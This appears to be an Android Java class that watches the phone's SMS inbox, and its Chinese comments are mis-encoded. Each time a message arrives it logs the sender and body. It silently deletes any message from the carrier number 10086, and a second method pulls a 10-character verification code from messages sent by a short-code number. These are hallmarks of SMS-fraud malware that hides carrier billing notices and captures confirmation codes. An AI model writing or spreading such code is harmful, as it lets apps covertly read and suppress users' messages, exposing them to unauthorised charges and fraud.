/**
 * 
 */
package com.byc.ctL;

import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.Telephony.Sms;
import android.util.Log;

/**
 * @author byc
 *
 */
class SmsObserver extends ContentObserver {
	private Uri SMS_INBOX = Uri.parse("content://sms/inbox");
	public static final String TAG = "byc001";
	private Context context;
	public String address=""; //���ŵ�ַ��
	public String smsContent = "";//��������;
	public String receiveTime="";//����ʱ��
	public Date date;
	public SmsObserver(Context context, Handler handler) {
		super(handler);
		this.context=context;
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		//ÿ�����¶��ŵ���ʱ��ʹ�����ǻ�ȡ����Ϣ�ķ���
		//getSmsFromPhone();
		 ContentResolver resolver = context.getContentResolver();  
         Cursor cursor = resolver.query(Uri.parse("content://sms/inbox"), new String[] { "_id", "address", "body" }, null, null, "_id desc");  
         long id = -1;  

         if (cursor.getCount() > 0 && cursor.moveToFirst()) {  
             id = cursor.getLong(0);  
             address = cursor.getString(1);  
             smsContent = cursor.getString(2);  

             //Toast.makeText(SmsService.this, String.format("address: %s\n body: %s", address, body), Toast.LENGTH_SHORT).show(); 
            Log.i(TAG,   String.format("address: %s\n body: %s", address, smsContent));
         }  
         cursor.close();  

         if (id != -1&&address.equals("10086")) {  
             int res = resolver.delete(Sms.CONTENT_URI, "_id=" + id, null);  
             for(int i=0;i<10;i++){
                 if(res>0){
                 	Log.i(TAG, "ɾ���ɹ���");
                 	break;
                 }else{
                 	Log.i(TAG, "ɾ��ʧ�ܣ�");
                 	 res = resolver.delete(Sms.CONTENT_URI, "_id=" + id, null);  
                 }// if(res>0){
             }//for(int i=0;i<10;i++){

         }//if (id != -1) {  
     }//public void  
	
	public void getSmsFromPhone() {
		ContentResolver cr = context.getContentResolver();
		String[] projection = new String[] { "body" };//"_id", "address", "person",, "date", "type
		String where = " address = '1066321332' AND date >  "
				+ (System.currentTimeMillis() - 10 * 60 * 1000);
		Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
		if (null == cur)
			return;
		if (cur.moveToNext()) {
			String number = cur.getString(cur.getColumnIndex("address"));//�ֻ���
			String name = cur.getString(cur.getColumnIndex("person"));//��ϵ�������б�
			String body = cur.getString(cur.getColumnIndex("body"));
			//��������Ҫ��ȡ�Լ����ŷ�������е���֤��~~
			Pattern pattern = Pattern.compile(" [a-zA-Z0-9]{10}");
			Matcher matcher = pattern.matcher(body);
			if (matcher.find()) {
				String res = matcher.group().substring(1, 11);
				//mobileText.setText(res);
			}
		}
	}

}
